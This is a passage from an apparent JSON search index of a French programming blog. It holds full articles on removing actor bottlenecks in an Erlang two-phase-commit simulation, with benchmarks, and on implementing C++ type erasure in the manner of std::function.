différemment et compte tenu de sa nature (souvent moins d'une dizaine de mots-clés), c'est compréhensible. Finalement, dans ce domaine, il faut comme toujours se demander si une méthode est bien adaptée à notre application et à nos données : la réponse n'est pas absolue (cf. Les questions à se poser ) et les deux exemples traités ci-dessus sont trop limités pour pouvoir conclure quoi que ce soit."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/trouver-et-supprimer-les-goulots-detranglement-en-erlang","title":"Trouver et supprimer les goulots d'étranglement en Erlang","text":"Introduction Erlang Modèle à acteur Programmation fonctionnelle Machine virtuelle Two-phase commit Méthodologie de suppression des goulots d'étranglement Itérations Itération 1 : Approche naïve Itération 2 : Extraction de la transaction Itération 3 : Extraction du Compte client Bilan Comparaison des performances Comparaison par itération et nombre de clients/banques Itération 1 : Approche naïve Itération 2 : Extraction de la transaction Itération 3 : Extraction du Compte client Comparaison par nombre de cœurs alloués Comparaison de la taille des codes Conclusion Notes Pour aller plus loin Comparaison par nombre de cœurs alloués Remarques Conclusion 2 Notes 2 Introduction Implanter des systèmes distribués est une tâche complexe qui requiert de bons outils et une bonne méthode afin que ces systèmes puissent passer à l'échelle. Nous verrons comment réaliser un Two-phase commit en Erlang et comment, en deux itérations, nous pouvons le rendre plus performant. Erlang Erlang est un langage de programmation fonctionnel basé sur le modèle à acteur, développé par Ericsson, afin de pouvoir construire des systèmes distribués et fiables. Erlang était destiné au domaine des télécommunications. Modèle à acteur Le modèle à acteur est une approche qui vise à concevoir un système sous la forme d'un ensemble de processus concurrents. Ces processus sont nommés Acteur s et lls communiquent par envoi de messages ( ou message passing ). Chaque acteur est l'unique propriétaire de ses propres données et il possède une messagerie comme point d'entrée où sont stockés les messages qui lui sont adressés et qu'il traitera par ordre d'arrivée . Programmation fonctionnelle La programmation fonctionnelle est à opposer à la programmation procédurale : il s'agit d'exprimer les relations entre les données plutôt que de décrire l'ordre des traitements qui leur seront appliqués. Le point principal à retenir est que les modifications de variables sont impossibles et, de ce fait, les boucles sont simulées par récursion. De plus, pour pouvoir représenter la progression d'un taitement, il faut impérativement construire une machine à états finis . Machine virtuelle De la même manière que les programmes JAVA et C# sont compilés vers du bytecode , pour être exécutés par une machine virtuelle, respectivement la JVM et la CLR. Les programmes Erlang sont compilés vers un format BEAM pour être exécutés par le Erlang runtime system . L'avantage de ce système est que la gestion des serveurs et des nœuds du système (ainsi que tous les aspects de gestion de pannes et de répartition de charge) soit confiée à la machine virtuelle et non au programme, ce qui le simplifie grandement. Tous ces aspects font que la machine virtuelle est en mesure de répartir la charge et les acteurs en fonction de leur communication, ce qui assure un passage à l'échelle quasi-linéaire, pour peu que le système ne comporte pas de problème de goulots d'étranglement. Two-phase commit Le Two-phase commit est un protocole utilisé pour permettre un consensus distribué, ici nous cherchons à garantir la cohérence des données d'un système. Pour les besoins de notre étude, nous allons implanter un Two-phase commit dans le cadre d'une gestion de comptes bancaires, de la manière suivante : Il y aura un Coordinateur chargé de relier les différentes banques entre elles. À cette fin, les Banques , lors de leur création, vont se déclarer au Coordinateur . Un Client s'inscrira alors auprès d'une Banque qui lui ouvrira un compte créditeur de 10 unités. Le Client fera, auprès de sa Banque , une demande de transfert d'une unité vers un autre Client . La Banque transmettra cette demande au Coordinateur . Le Coordinateur contactera toutes ses Banques pour savoir laquelle gère le compte du bénificiaire. La Banque , gestionnaire du compte du Client destinataire, répondra au Coordinateur . Le Coordinateur demandera à la Banque du Client émetteur de s'assurer qu'il dispose de suffisament d'argent pour effectuer le virement. Le Coordinateur effectuera un commit en émettant deux demandes d'actions : respectivement ajouter et retirer une unité. Si la Banque du Client émetteur ne possède plus suffisament d'unités, elle le signalera au Coordinateur . Le Coordinateur émettra alors une demande de rollback auprès de la Banque du destinataire qui lui retirera une unité. Méthodologie de suppression des goulots d'étranglement Pour supprimer les goulots d'étranglement, il faut chercher les acteurs qui ont beaucoup de données ou qui reçoivent beaucoup de messages et en extraire une responsabilité dans un nouvel acteur. Itérations En partant de ce concept, trois versions, détaillées ci-dessous, ont été dérivées. Toutes les sources se trouvent à cette adresse : https://github.com/blackheaven/bottleneck-buster . Itération 1 : Approche naïve Comme son nom l'indique, il s'agit juste d'une implantation brute de l'algorithme. Les sources de la version se trouvent dans le répertoire dirty . Itération 2 : Extraction de la transaction Le but ici est de décharger le Coordinateur , qui était devenu le goulot d'étranglement du système, du fait qu'il conduisait toutes les transactions, en créant un acteur chargé de gérer une Transaction . Le rôle du Coordinateur se limite à trouver la Banque du Client destinataire. Qui plus est, la Transaction est en mesure de se relancer par elle-même, en cas d'échec. Les sources de la version se trouvent dans le répertoire clean . Itération 3 : Extraction du Compte client Le but ici est de décharger les Banques , devenues, à leur tour, le goulot d'étranglement du système, car elles géraient tous les mouvements bancaires, par la création d'un acteur chargé de la gestion d'un Compte client . Le rôle de la Banque se borne à trouver les Comptes clients . Les sources de la version se trouvent dans le répertoire extreme . Bilan Comparaison des performances Pour comparer les performances, nous allons utiliser le module sim qui se chargera de créer un Coordinateur et un nombre paramétrable de Banques et de Clients par Banque . Puis, pour générer un nombre suffisant de Transactions , le module va ordonner, pour chaque Client , un transfert vers tous les autres Clients . Pour ce faire, dans le Shell d'Erlang (lancé via $ erl ) nous entrerons les commandes suivantes : Erlang R16B03 (erts-5.10.4) [source] [smp:2:2] [async-threads:10] [kernel-poll:false] Eshell V5.10.4 (abort with &#94;G) 1> c(coordinator). c(bank). c(client). c(sim). {ok,coordinator} 2> c(bank). c(client). c(sim). {ok,bank} 3> c(client). c(sim). {ok,client} 4> c(sim). {ok,sim} 5> sim:run(1,1). % Préchauffe ok 6> timer:tc(sim, run, [5, 10]). % Crée 5 banques avec 10 clients par banque {470612,ok} % Temps en µs Pour chaque mesure, 3 lancements successifs ont été réalisés et la moyenne obtenue donne le résultat reporté. Tous les tests ont été réalisés à l'aide d'un ordinateur doté d'un i7 870 @ 2.93 GHz avec HyperThreading activé , ce qui représente 8 cœurs logique , ainsi que 16 Gio de mémoire vive. L'ordinateur tourne sous FreeBSD 9.2-AMD64 GENERIC et Erlang est en version 16.b.03 . Comparaison par itération et nombre de clients/banques Il s'agit de mettre en évidence la capacité du système à gérer d'avantage de demandes avec un nombre fixe de ressources, pour observer si sa montée en charge est linéaire ou non. Chaque ligne représente le nombre de Banques et chaque colonne le nombre de Clients par Banque . Chaque cellule indique le résultat en millisecondes . Itération 1 : Approche naïve # 2 4 6 8 10 1 0 0 0 1 3 2 0 1 5 16 37 3 1 5 24 84 231 4 2 18 105 342 931 5 3 54 241 1021 2740 Itération 2 : Extraction de la transaction # 2 4 6 8 10 1 0 0 0 1 2 2 0 1 2 3 6 3 0 1 3 7 17 4 1 2 6 16 30 5 1 4 11 27 49 Itération 3 : Extraction du Compte client # 2 4 6 8 10 1 0 0 1 1 1 2 0 1 1 2 4 3 1 1 2 5 10 4 1 2 5 11 24 5 1 3 9 21 50 On constate que le fait d'avoir extrait la Transaction a augmenté drastiquement les performances, puisqu'on observe des performances jusqu'à 60 fois supérieures . En revanche, l'écart n'est pas significatif pour l'extraction du Compte client , mais nous pouvons pondérer ceci par le fait que les échelles de temps étant tellement faibles, le moindre événement système peut fausser les résultats. Il faudrait comparer avec un jeu d'essais plus importants. Comparaison par nombre de cœurs alloués Il s'agit de mettre en évidence la capacité du système à gérer d'avantage de demandes avec un nombre fixe de ressources, pour observer si sa montée en charge est linéaire ou non. Chaque ligne représente le nombre de Banques et chaque colonne le nombre de Clients par Banque . Il s'agit de mettre en évidence la capacité du système à gérer une demande fixe ( 8 Banques avec 10 Clients chacune ) avec un nombre croissant de ressources, pour observer sa capacité à passer à l'échelle. Chaque ligne représente une itération et chaque colonne le nombre de cœurs CPU alloués . Chaque cellule indique le résultat en millisecondes . # 1 2 3 4 5 6 7 8 1 1 14 76 272 793 2152 4105 8019 2 1 3 7 13 25 44 90 168 3 1 4 8 16 30 60 75 190 Les remarques sont les mêmes qu'à la section précédente : on constate que la perte en performances (par rapport à un gain linéaire en performances), due à l'ajout de ressources, est jusqu'à 70 fois moindre pour les itérations 2 et 3. De la même manière, on ne constate pas de différences flagrantes entre les deux dernières itérations. Comparaison de la taille des codes Ici, nous tentons de déterminer si l'accroissement de la vitesse du système et de sa capacité à passer à l'échelle ne s'est pas fait au détriment d'un ajout de complexité dans le-dit système. Nous allons donc comparer le nombre de lignes de code non-vides nécessaires à chaque acteur. Chaque ligne représente une itération et chaque colonne un acteur. Chaque cellule indique le nombre de lignes de code . # Coordinateur Banque Client Transaction Compte client Total 1 44 76 23 - - 143 2 14 76 15 27 - 132 3 14 39 15 29 28 125 Le système a vu son nombre de lignes diminué de plus de 10%, ce qui implique une simplification de celui-ci. De plus, le nombre moyen de lignes par acteur est, lui, passé de 48 à 25, ce qui indique une diminution de près de la moitié, rendant ainsi les acteurs plus simples, plus compréhensibles et donc plus maintenables. Conclusion Nous avons vu qu'Erlang nous permettait de construire, simplement et rapidement, des systèmes concurrents et distribués : cela s'avère utile pour tester des protocoles et des architectures. Nous avons vu que la diminution du nombre de données par acteur et leur simplification augmentait la capacité du système à passer à l'échelle. Notes Toutes les sources se trouvent à cette adresse : https://github.com/blackheaven/bottleneck-buster/ . Cette étude n'a pas pris en compte toute une partie de la détection des goulots d'étranglement basée sur le profiling car La documentation officielle présente un certain nombre d'outils qui ne permettent de mettre en valeur que les sous-fonctions consommant le plus de ressources CPU, comme tous les outils de profiling de langages standard. Cette approche n'est plus pertinente* dans ce genre de systèmes où des métriques, comme le nombre de ressources consommées par acteur, le nombre de messages envoyés et reçus par acteur ainsi que son nombre de liens (nombre d'acteurs auxquels il a envoyé un message ou qui lui en ont envoyé un), sont plus utiles pour trouver les goulots d'étranglement. * Cependant, une intervention faite par Concurix lors du Erlang Factory SF Bay Area 2013 durant laquelle a été présenté un outil de visualisation graphique des goulots d'étranglement qui semble plus adapté à la recherche de goulots d'étranglement. Malheureusement, le-dit outil comporte deux parties : une partie à installer en local (nommée concurix_runtime ) et une autre partie hébergée sur les serveurs de Concurix, désactivée suite à un changement d'API, mais qui sera, après un échange de courriels avec Concurix, remise en place dans les prochains mois. Pour aller plus loin Nous avions vu plus haut que les deux dernières itérations étaient tellement efficaces que leurs performances ne pouvaient pas être appréciées sur un si petit échantillon ( 8 Banques avec 10 Clients chacune ) et surtout pas en présence de la première itération, il est temps de muscler notre jeu. Comparaison par nombre de cœurs alloués Il s'agit de mettre en évidence la capacité du système à gérer d'avantage de demandes avec un nombre fixe de ressources, pour observer si sa montée en charge est linéaire ou non. Chaque ligne représente le nombre de Banques et chaque colonne le nombre de Clients par Banque . Il s'agit de mettre en évidence la capacité du système à gérer une demande fixe ( 15 Banques avec 1.000.000 Clients chacune ) avec un nombre croissant de ressources, pour observer sa capacité à passer à l'échelle. Chaque ligne représente une itération et chaque colonne le nombre de cœurs CPU alloués . Chaque cellule indique le résultat en millisecondes . # 1 2 3 4 5 6 7 8 2 5 32 85 312 469 1945 2037 2053 3 4 18 40 103 512 1088 1845 4016 Remarques Nous pourrions être surpris vis-à-vis des résultats, visiblement la simplification a nuit à la capacité de notre système à passer à l'échelle. La cause est en partie détaillé dans cet article : comme nous l'avons vu plus haut Erlang a été conçu pour être utilisé dans le secteur des télécommunications où l'une des notions clef de ce secteur est le temps réel, Erlang a donc intégré un cadre de Temps-réel mou . Dans cette optique chaque fois qu'un acteur reprend son fil d'exécution il se voit attribué un budget de réductions de 2.000. En fonction des instructions qu'il va exécuter (conditions, envois de messages, appels de fonctions), se budget va être diminué d'un coup prédéterminé en fonction de l'instruction. Une fois ce budget épuisé, l'acteur est suspendu (on dit qu'il est préempté ) et son exécution reprendra ultérieurement. Nous pouvons nous demander ce que cela implique pour nous lors du passage à l'échelle, la réponse est simple, un acteur à un nombre fixe d'actions qu'il peut effectuer sur une période de temps donnée, ce qui donne son débit maximal, son nombre de messages traités par unité de temps. Lorsque tous les acteurs sont sur le même cœur, ils ont grosso-modo tous le même débit, ce qui laisse le temps à notre acteur \"central\" (qui communique avec un grand nombre d'autre acteurs) de traiter les messages qu'il reçoit en conservant une file de messages à une taille plus ou moins fixe. En revanche, dès qu'il y a plusieurs cœurs, tous les acteurs qui envoient des messages à notre acteur central peuvent le faire en même temps, ce qui augmente le débit entrant de notre acteur central et comme nous l'avons vu, son débit maximal n'augmente pas, sa file d'attente va donc croître, ce qui va créer une contention dans le système. Comme si ça n'était pas suffisant, l'incapacité de notre acteur central à répondre rapidement à toutes ces demandes va causer des attentes prolongées des acteurs demandeurs, on parle alors de famine . Mais le budget de réductions va plus loin, en effet, en fonction de la localisation d'un acteur (c'est-à-dire le fait qu'il soit sur le même cœur, sur un autre cœur ou sur une autre machine), l'envoi de message ne va pas avoir le même coût de réduction. Le Erlang runtime system va donc tenter de rapprocher les acteurs qui communiquent le plus, ce qui est problématique dans notre cas puisque tout le monde communique avec tout le monde et tout le temps. Erlang va donc passer son temps à déplacer les acteurs de cœurs en cœurs ce qui va lui faire perdre un temps considérable. Conclusion 2 Nous avons vu que simplifier les acteurs pouvait entraîner une perte de capacité de passage à l'échelle. Bien que cela arrive souvent dans les systèmes réels, les causes de ces symptômes dans exemple jouet sont bien éloignées des causes que l'on trouve dans les systèmes réels, voici ces causes : les opérations effectuées sont très simples (très peu coûteuses en instructions) et ne présentent que peu d'intérêt à être distribuées tout le monde communique avec tout le monde et tout le temps, ce qui n'est pas le cas dans les systèmes réels où le nombre de relation est limité et où les échanges sont répartis dans le temps La morale de cette histoire est qu'une bonne intuition ne peut pas se permettre de ne pas être confirmée par un test, lorsque l'on tente d'optimiser un système, la méthodologie est censée être la suivante : conception d'une première version mesures de performances optimisations mesures de performances comparaison des mesures Il s'agit de l'unique moyen de savoir si nous avons contribué à améliorer les performances du système ou non. Notes 2 Pour pallier à ce problème, Concurix a modifié le budget des réductions, pour l'adapter au nombre de messages reçus plutôt qu'un nombre fixé à l'avance, ce qui a entraîné d'importantes accélérations dans les systèmes réels."},{"tags":"content","url":"https://yliesc.github.io/pages/pdp/content/type-erasure","title":"Type Erasure","text":"Introduction Le C++ ne permet pas de stocker des objets hétérogènes dans un même conteneur, ce qui peut être nécessaire dans certaines situations. Cette problématique est souvent celle utilisée pour introduire le polymorphisme d'inclusion, cependant la problématique est plus générale et peut exister sans qu'il soit possible d'utiliser directement ce polymorphisme. Introduction Typage Définition Relation d'ordre Polymorphismes Plusieurs polymorphismes Polymorphisme paramétrique Polymorphisme d'inclusion Problématique Approche du problème Première solution Seconde solution Implémentation Adaptateur (Wrapper)6 générique Polymorphisme d'inclusion Second adaptateur Améliorations Factorisation de enable_if Sémantique de copie Adaptateurs Conclusion Typage Définition Un des objectifs du typage du C++ est d'associer à une zone définie et continue de la mémoire une sémantique, c'est-à-dire ce qu'on peut faire avec cet espace mémoire. On appelle un tel espace un objet et la sémantique le type de l'objet . La sémantique est essentiellement 1 déterminée par les fonctions que l'on peut appliquer à un tel objet, un type peut donc se définir par l'ensemble des fonctions qui lui sont associées. Notons ici que le type de l'objet ne dépend que de l'objet, il n'est pas à confondre avec le type d'une expression qui va associer une sémantique à une expression et peut être de deux natures statique ou dynamique . Illustrons ceci : struct B {}; struct D : B {}; B * p = new D (); Ici l'objet occupe la zone entre les adresses p et p+sizeof(D) , et son type est D , le type statique de l'expression *p est B alors que son type dynamique est D . Relation d'ordre On peut définir un ordre entre les types en fonction des opérations qu'ils supportent. Concrètement : struct G {}; struct H {}; void foo ( G & ); void foo ( H & ); void bar ( G & ); On peut noter $H < G$, qui signifie que toutes les expressions valables avec une expression de type statique H le seront avec une expression de type statique G . Polymorphismes Plusieurs polymorphismes On va parler ici de deux polymorphismes du C++, celui paramétrique et celui d'inclusion. Outre les différences syntaxiques 2 , ils diffèrent par la résolution de l'appel : Le polymorphisme paramétrique est résolu à la compilation, ce qui permet de profiter du typage et du compilateur pour s'assurer des opérations effectuées ; Le polymorphisme d'inclusion est résolu à l'exécution 3 , on perd l'avantage du typage, mais cela peut être nécessaire lorsque le type d'un objet sera déterminé à l'exécution, c'est-à-dire lorsque l'on a déjà perdu l'avantage du typage. Concrètement, le polymorphisme intervient dans cette situation : foo ( expr ); Le polymorphisme paramétrique va conserver le type statique de expr lors de la réalisation des opérations de foo , dans le cas du polymorphisme d'inclusion 4 ce sera le type dynamique de expr qui sera utilisé. Polymorphisme paramétrique La syntaxe typique du polymorphisme paramétrique est : template < class T > void foo ( T & t ) { /*stuff on t*/ } L'ensemble des fonctions qui vont être appelées sur t définissent un type virtuel C et chaque argument template T valide respecte $C<T$. Ce type C représente un concept qui doit être respecté lors de l'appel. Polymorphisme d'inclusion Dans le cas du polymorphisme d'inclusion, la syntaxe est : struct B { virtual void foo () { /*stuff*/ } virtual ~ B () {} }; struct D : B { void foo () { /*other stuff*/ } }; On a directement la relation $B<D$, c'est le point commun entre les deux polymorphismes : chaque classe fille propose l'interface de la classe mère comme chaque argument template respecte un concept 5 . Problématique Approche du problème La problématique intervient lorsque l'on ne peut plus conserver le type de l'objet grâce au polymorphisme paramétrique, il s'agit typiquement des situations où le type de l'objet créé est déterminé à l'exécution, par exemple : struct G { void foo () { std :: cout << \"G\" << std :: endl ; } }; struct H { void foo () { std :: cout << \"H\" << std :: endl ; } }; std :: vector < /*?*/ > vec ; int i ; std :: cin >> i ; switch ( i ) { case 1 : vec . push_back ( G ()); break ; case 2 : vec . push_back ( H ()); break ; } vec [ 0 ]. foo (); G et H représentent deux types distincts, que mettre à la place de /*?*/ ? Les opérations que l'on effectue sur vec[0] , ici l'appel à la fonction membre foo , définissent à nouveau un type C qui respecte $C<G$ et $C<H$, cependant on ne peut pas profiter du polymorphisme paramétrique, le C++ nous demande sur quel type travaille le conteneur std::vector . Première solution Il va donc s'agir de rendre réel ce type virtuel C , une première solution nous est proposée par le polymorphisme d'inclusion grâce au point commun existant entre les deux polymorphismes mis en évidence dans la partie précédente. Concrètement il s'agit de mettre en place une classe de base et d'adapter la syntaxe pour manipuler des pointeurs 6 : struct C { virtual void foo () = 0 ; virtual ~ C (){} }; struct G : C { void foo () { std :: cout << \"G\" << std :: endl ; } }; struct H : C { void foo () { std :: cout << \"H\" << std :: endl ; } }; std :: vector < std :: unique_ptr < C >> vec ; int i ; std :: cin >> i ; switch ( i ) { case 1 : vec . push_back ( std :: make_unique < G > ()); break ; case 2 : vec . push_back ( std :: make_unique < H > ()); break ; } vec [ 0 ] -> foo (); On a ici appliqué un type erasure : on a créé un type plus faible que le type des objets que l'on manipule et convenant à l'utilisation que l'on fait de ces objets. Cette première solution est fonctionnelle mais présente un défaut, en effet dans le cas du polymorphisme paramétrique, l'existence du concept est orthogonale à l'existence de types le respectant, alors que dans le cas du polymorphisme d'inclusion, la classe de base est nécessaire pour réaliser les classes dérivées. Ainsi l'utilisation directe du polymorphisme d'inclusion pour la réalisation d'un type erasure a un défaut : elle est intrusive, c'est-à-dire que l'on a introduit des modifications dans des éléments existants, ici G et H . Si l'on a ce besoin et que les types existent déjà, on se retrouve face à un mur : on ne peut pas ajouter une classe de base à des types qui existent déjà. Seconde solution Une seconde solution vient répondre à ce problème, avant d'en présenter une implémentation, donnons un exemple concret présent dans la bibliothèque standard. En C++ il existe plusieurs expressions supportant la syntaxe fun() , par exemple : void foo () { std :: cout << \"foo\" << std :: endl ; } struct F { void operator ()() const { std :: cout << \"bar\" << std :: endl ; } }; F bar ; auto goo = []() { std :: cout << \"goo\" << std :: endl ; }; foo (); bar (); goo (); Ici les types de foo , bar et goo sont différents, n'ont pas de type de base commun et il nous est impossible d'en rajouter un. Ainsi dans la situation suivante : std :: vector < /*?*/ > vec ; int i ; std :: cin >> i ; switch ( i ) { case 1 : vec . push_back ( foo ); break ; case 2 : vec . push_back ( bar ); break ; case 3 : vec . push_back ( goo ); break ; } vec [ 0 ](); Que mettre à la place de /*?*/ ? La bibliothèque standard nous propose ici le type std::function<void()> , il est plus faible que les types de foo , bar et goo et convient pour réaliser l'opération vec[0]() : on a un type erasure sans avoir introduit de classe de base commune aux types de nos trois objets. De manière concrète, si vous exécutez ce code, il va attendre une entrée 7 et selon celle-ci l'expression vec[0] de type std::function<void()>& va correspondre à l'objet foo , bar ou goo : on n'a plus accès aux types de ces objets, par contre le type std::function<void()> nous permet de faire vec[0]() grâce à sa fonction membre operator() en ayant le comportement attendu, c'est-à-dire un appel à foo() , bar() ou goo() selon l'entrée utilisateur saisie. Implémentation Adaptateur ( Wrapper ) 6 générique Nous allons implémenter une classe qui fait exactement la même chose que std::function<void()> , nommons là function . Dans la partie précédente nous avons une implémentation dans le cas où l'on peut ajouter une classe de base à nos types. Si l'on arrive à créer une classe pour chacun des types foo , bar et goo qui supporte la syntaxe fun() , c'est-à-dire qui a un operator() , et peut contenir respectivement foo , bar ou goo , alors on pourra introduire notre classe de base. Une telle classe correspond à un adaptateur, pour foo il ressemblerait à : struct foo_class { template < class F3 , class = std :: enable_if_t <! std :: is_same < foo_class , std :: decay_t < F3 >>:: value >> foo_class ( F3 && fun3 ) : fun2 ( std :: forward < F3 > ( fun3 )) { } void operator ()() { fun2 (); } private : /*foo_type*/ fun2 ; }; La syntaxe utilisée pour le constructeur est celle du perfect forwarding selon ce qui est passé au constructeur, un temporaire ou non, l'argument template F3 sera /*foo_type*/ ou /*foo_type*/& 7 où /*foo_type*/ est le type de foo . enable_if_t permet de désactiver 8 le constructeur si l'argument template F3 est déduit à foo_class ou foo_class& ce qui permet d'assurer que ces appels soient pris en charge par les constructeurs par copie et déplacement. Les classes pour bar ou goo seront similaires, le C++ a un outil pour factoriser des codes qui se ressemblent : les template de classe. Nommons ce template function_impl : template < class F2 > struct function_impl { template < class F3 , class = std :: enable_if_t <! std :: is_same < function_impl , std :: decay_t < F3 >>:: value >> function_impl ( F3 && fun3 ) : fun2 ( std :: forward < F3 > ( fun3 )) { } void operator ()() { fun2 (); } private : F2 fun2 ; }; Polymorphisme d'inclusion On peut alors introduire une classe de base, nommée function_base 9 , comme dans notre première implémentation : struct function_base { virtual void operator ()() = 0 ; virtual ~ function_base () { } }; template < class F2 > struct function_impl : function_base { template < class F3 , class = std :: enable_if_t <! std :: is_same < function_impl , std :: decay_t < F3 >>:: value >> function_impl ( F3 && fun3 ) : fun2 ( std :: forward < F3 > ( fun3 )) { } void operator ()() { fun2 (); } private : F2 fun2 ; }; On peut alors utiliser notre système comme dans la première partie : std :: vector < std :: unique_ptr < function_base >> vec ; int i ; std :: cin >> i ; switch ( i ) { case 1 : vec . push_back ( std :: make_unique < function_impl < decltype ( & foo ) >> ( foo )); break ; case 2 : vec . push_back ( std :: make_unique < function_impl < decltype ( bar ) >> ( bar )); break ; case 3 : vec . push_back ( std :: make_unique < function_impl < decltype ( goo ) >> ( goo )); break ; } ( * vec [ 0 ])(); Second adaptateur C'est fonctionnel, mais on n'est pas encore à ce que propose std::function<void()> : utilisation moins flexible à cause du besoin de déréférencer et excès de verbosité lors de l'insertion. Pour améliorer les choses l'on va réaliser un adaptateur sur ce std::unique_ptr et profiter d'un constructeur template pour éviter la répétition avec le decltype : struct function { template < class F1 , class = std :: enable_if_t <! std :: is_same < function , std :: decay_t < F1 >>:: value >> function ( F1 && fun1 ) : func ( std :: make_unique < function_impl < std :: decay_t < F1 >>> ( std :: forward < F1 > ( fun1 ))) { } void operator ()() const { ( * func )(); } private : std :: unique_ptr < function_base > func ; }; On a cette fois quelque chose de fonctionnel proche de ce que propose std::function<void()> : std :: vector < function > vec ; int i ; std :: cin >> i ; switch ( i ) { case 1 : vec . push_back ( foo ); break ; case 2 : vec . push_back ( bar ); break ; case 3 : vec . push_back ( goo ); break ; } vec [ 0 ](); Améliorations Factorisation de enable_if On peut encore améliorer notre implémentation, le premier point est de factoriser les deux lignes suivantes : class = std :: enable_if_t <! std :: is_same < function_impl , std :: decay_t < F3 >>:: value > class = std :: enable_if_t <! std :: is_same < function , std :: decay_t < F1 >>:: value >> On va réaliser un nouvel alias, nommé dispatch_ctor : template < class C , class T > using dispatch_ctor = std :: enable_if_t <! std :: is_same < C , std :: decay_t < T >>:: value > ; Ce qui conduit à réécrire notre implémentation sous la forme : template < class F2 > struct function_impl : function_base { template < class F3 , class = dispatch_ctor < function_impl , F3 >> function_impl ( F3 && fun3 ) : fun2 ( std :: forward < F3 > ( fun3 )) { } void operator ()() { fun2 (); } private : F2 fun2 ; }; struct function { template < class F1 , class = dispatch_ctor < function , F1 >> function ( F1 && fun1 ) : func ( std :: make_unique < function_impl < std :: decay_t < F1 >>> ( std :: forward < F1 > ( fun1 ))) { } void operator ()() const { ( * func )(); } private : std :: unique_ptr < function_base > func ; }; Sémantique de copie En l'état function n'est pas copiable, or lorsque l'on est certain que les types que l'on veut affaiblir sont copiables, il est pertinent de vouloir que le type erasure le soit aussi. Pour permettre la copie, il faut disposer d'une fonction clone dans le premier adaptateur qui va effectuer la copie 10 : struct function_base { virtual std :: unique_ptr < function_base > clone () const = 0 ; virtual void operator ()() = 0 ; virtual ~ function_base () { } }; template < class F2 > struct function_impl : function_base { template < class F3 , class = dispatch_ctor < function_impl , F3 >> function_impl ( F3 && fun3 ) : fun2 ( std :: forward < F3 > ( fun3 )) { } std :: unique_ptr < function_base > clone () const { return std :: make_unique < function_impl > ( fun2 ); } void operator ()() { fun2 (); } private : F2 fun2 ; }; struct function { template < class F1 , class = dispatch_ctor < function , F1 >> function ( F1 && fun1 ) : func ( std :: make_unique < function_impl < std :: decay_t < F1 >>> ( std :: forward < F1 > ( fun1 ))) { } function ( function const & rhs ) : func ( rhs . func -> clone ()) { } function & operator = ( function const & rhs ) { func = rhs . func -> clone (); return * this ; } function ( function && ) = default ; function & operator = ( function && ) = default ; void operator ()() const { ( * func )(); } private : std :: unique_ptr < function_base > func ; }; Adaptateurs L'utilisation que l'on a fait jusqu'ici de ce pattern est assez naïve, on adapte peu de chose puisque l'interface que l'on propose est la même que celle du type adapté. Pour s'en apercevoir, il suffit de remarquer que d'un côté la nomenclature utilisée aux lignes 4 , 19 et 44 n'est pas primordiale tant qu'elle est cohérente sur ces trois lignes, et que seul celle à la ligne 43 a de l'importance et définit l'interface. Par exemple on pourrait avoir une fonction libre à la place d'une fonction membre : friend void apply ( function const & lhs ) { ( * lhs . func )(); } Qui s'utiliserait ainsi : apply(vec[0]); 11 . De l'autre côté de l'adaptateur il y a le comportement, à nouveau dans notre situation il se limite à la ligne 20 mais il pourrait être aussi complexe qu'on le veut et pourrait varier selon le type. En effet la spécialisation template permet de changer l'implémentation de l'adaptateur selon le type, cependant cette spécialisation est intrusive, il faut donc la réserver aux types que l'on connait lors de la création de notre type erasure , typiquement les types fondamentaux 12 Par exemple std::function<void(A&)> permet de stocker un pointeur de fonction membre de A ne prenant pas de paramètre et ne retournant rien, disons une fonction nommé hoo . La syntaxe (&hoo)(a) , où A a , n'est pas supportée, mais le comportement que l'on pourrait attendre est celui de (a.*(&A::hoo))(); . En spécialisant l'adaptateur qui correspond à notre function_impl pour le type void (A::*)() on peut avoir une utilisation de cette syntaxe dans ce cas particulier. Ce qui permet de faire : std :: function < void ( A & ) > f ( & A :: hoo ); A a ; f ( a ); Conclusion Vous avez maintenant tout les éléments pour répondre aux divers problématiques qui demandent d'avoir des collections hétérogènes. N'oubliez cependant pas de consulter les documentations des bibliothèques que vous utilisez pour vérifier que le type erasure dont vous avez besoin n'existe pas déjà. Merci à lmghs , saroupille et Maëlan pour leurs conseils. Pas uniquement, l'organisation des données au sein de la zone mémoire et le nom du type en font aussi partie. ↩ Importantes pour écrire du code, mais n'influencent pas fondamentalement le choix entre l'un et l'autre. ↩ Le C++ ne fera cette résolution qu'en fonction d'un objet, le langage ne dispose pas de multi-méthode (il existe des techniques pour effectuer du multi-dispatch en C++, mais ce n'est pas notre sujet). ↩ La syntaxe d'appel est alors expr.foo() . ↩ A l'heure actuelle le C++ ne propose aucun outil pour exprimer concrètement un concept, c'est cependant en projet pour une future version du langage. ↩ Il s'agit d'un patron de conception ( design pattern ). ↩ ↩ Ou une version const et/ou volatile de ces types. ↩ ↩ enable_if_t est un alias sur enable_if<B>::type qui n'existe pas si la condition B est fausse et dans ce cas le constructeur n'existe pas non plus. ↩ Je ne la nomme pas function par anticipation sur la suite. ↩ Il s'agit de la construction idiomatique lorsque l'on veut copier des éléments d'une hiérarchie polymorphe. ↩ Ce qui n'a aucun intérêt dans cette situation, mais peut en avoir d'en d'autre. ↩ Dans les autres situations, l'utilisateur devra mettre en place son propre adaptateur. ↩"},{"tags":"pages","url":"https://yliesc.github.io/pages/wiki","title":"Wiki","text":""}]}